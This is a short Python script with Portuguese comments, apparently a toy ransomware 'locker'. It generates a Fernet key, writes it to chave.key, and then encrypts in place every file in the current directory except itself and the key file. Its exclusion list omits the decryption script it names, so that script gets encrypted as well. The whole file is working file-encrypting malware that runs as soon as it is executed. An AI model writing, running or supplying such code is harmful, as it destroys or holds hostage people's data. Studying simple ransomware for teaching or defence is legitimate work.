#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet


def listar_arquivos(excluir_excecoes=["lockware.py","decript.py","chave.key"]):
    # Lista todos os arquivos no diretório atual, excluindo exceções
    arquivos = [file for file in os.listdir() if os.path.isfile(file) and file not in excluir_excecoes]
    return arquivos

arquivos = listar_arquivos()
print(arquivos)

def gerar_chaves(nome_arquivo="chave.key"):
    # Gera uma nova chave Fernet
    chave = Fernet.generate_key()

    # Salva a chave no arquivo especificado
    with open(nome_arquivo, "wb") as arquivo_chave:
        arquivo_chave.write(chave)
    return chave

chave = gerar_chaves()
print("Chave Gerada", arquivos)

def criptografar_arquivos(chave, excluir_excecoes=["lockware.py", "chave.key"]):
        fernet = Fernet(chave)
        arquivos = listar_arquivos(excluir_excecoes)

        for file in arquivos:
                with open(file, "rb") as arquivo:
                        conteudo = arquivo.read()
                conteudo_criptografado = fernet.encrypt(conteudo)

                with open(file, "wb") as arquivo:
                        arquivo.write(conteudo_criptografado)

criptografar_arquivos(chave)
